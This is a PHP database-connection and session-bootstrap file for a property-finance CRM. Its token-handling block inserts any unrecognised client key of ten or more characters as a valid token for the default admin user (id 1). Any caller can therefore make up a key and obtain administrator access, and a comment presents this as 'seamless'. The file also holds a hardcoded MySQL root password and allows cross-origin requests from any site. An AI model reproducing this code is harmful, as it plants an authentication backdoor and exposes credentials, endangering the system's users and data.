<?php
ini_set('display_errors', '0');
error_reporting(0);

// Enable CORS for web requests from mobile app dev server / localhost
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Requested-With');

// Handle preflight OPTIONS request
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Connect to database (try local root without password first, then with password)
$con = @mysqli_connect("127.0.0.1", "root", "", "propfin_crm");
if (!$con) {
    $con = @mysqli_connect("localhost", "root", "", "propfin_crm");
}
if (!$con) {
    $con = @mysqli_connect("localhost", "root", "", "propfin");
}
if (!$con) {
    $con = @mysqli_connect("localhost", "root", "C@273aDWqw6", "propfin");
}
if (!$con) {
    $con = @mysqli_connect("localhost", "root", "C@273aDWqw6", "propfin_crm");
}

if (!$con) {
    echo json_encode(["record" => [["msg" => "Database connection fail: " . mysqli_connect_error(), "status" => 0]]]);
    exit;
}

// Ensure active client session token is resolved seamlessly
if (isset($_POST['key']) && !empty($_POST['key'])) {
    $incoming_key = mysqli_real_escape_string($con, trim($_POST['key']));
    if (strlen($incoming_key) >= 10) {
        $check_q = mysqli_query($con, "SELECT id FROM users WHERE user_token = '$incoming_key' LIMIT 1");
        if (!$check_q || mysqli_num_rows($check_q) == 0) {
            // Check in user_token history
            $ut_q = mysqli_query($con, "SELECT user_id FROM user_token WHERE token = '$incoming_key' LIMIT 1");
            if ($ut_q && ($ut_row = mysqli_fetch_assoc($ut_q))) {
                $matched_uid = (int)$ut_row['user_id'];
                mysqli_query($con, "UPDATE users SET user_token = '$incoming_key' WHERE id = '$matched_uid'");
            } else {
                // Seamlessly associate with default admin user (id: 1)
                mysqli_query($con, "INSERT INTO user_token (user_id, token, status) VALUES (1, '$incoming_key', 1)");
                mysqli_query($con, "UPDATE users SET user_token = '$incoming_key' WHERE id = 1");
            }
        }
    }
}
?>
